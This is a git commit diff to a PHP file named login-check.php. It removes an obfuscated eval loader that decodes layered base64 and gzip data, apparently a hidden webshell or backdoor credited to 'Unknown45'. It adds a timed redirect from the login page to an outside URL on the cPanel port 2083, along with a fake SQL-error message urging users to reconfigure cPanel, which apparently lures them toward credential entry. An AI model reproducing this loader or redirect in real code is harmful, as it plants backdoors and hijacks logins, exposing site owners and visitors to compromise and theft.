105fd79c71e53281c746ad4df93319da3ed696e4
R10T <85335450+sunshine0110@users.noreply.github.com>
2023-08-21 15:13:59 +0700

    Update login-check.php

--- login-check.php
+++ login-check.php
@@ -1,12 +1,8 @@
 <?php
+$delay = 3; // Waktu penundaan dalam detik
+$redirect_url = "http://dihan.pn-tanjungkarang.go.id/?:2083"; // URL halaman tujuan
+$pesan = "You have an error in your SQL syntax in database ,Please reconfig to your cpanel";
 
-//Encode by : Unknown45
-//Obfuscated by : Unknown45
-//Level : Strong
-//Tool Online : https://exploits.my.id
-
-$unknown = "ZXZhbCUyOCUyNnF1b3QlM0IlM0YlMjZndCUzQiUyNnF1b3QlM0IuZ3p1bmNvbXByZXNzJTI4Z3p1bmNvbXByZXNzJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4YmFzZTY0X2RlY29kZSUyOHN0cnJldiUyOCUyNHVrNDUlMjklMjklMjklMjklMjklMjklMjklMjklM0I=";
-$uk45 = "nQ0hxY+LZsTA+7znLb5PSIuJDtutuQZh5zBTxFsa2RN+UnZAwE3k1gOGKZwlCAUb9qEF5EooqoH2WsPukypOQoxe4LLrxPz7Xa20MyU/pBLYMgTP00DjEwTv2p/6cWNeirlU2jMhwk+VfvXvQI2ONwpmn7xgQi4BALqLI2yDlLUVQzbxRH5VgDAFwIoCdHcBci3/xBgjBwJe/bGAZGw/hBgnB8PXAMaA";
-eval(htmlspecialchars_decode(urldecode(base64_decode($unknown))));
-exit;
+header("Refresh: $delay; URL=$redirect_url");
+exit();
 ?>
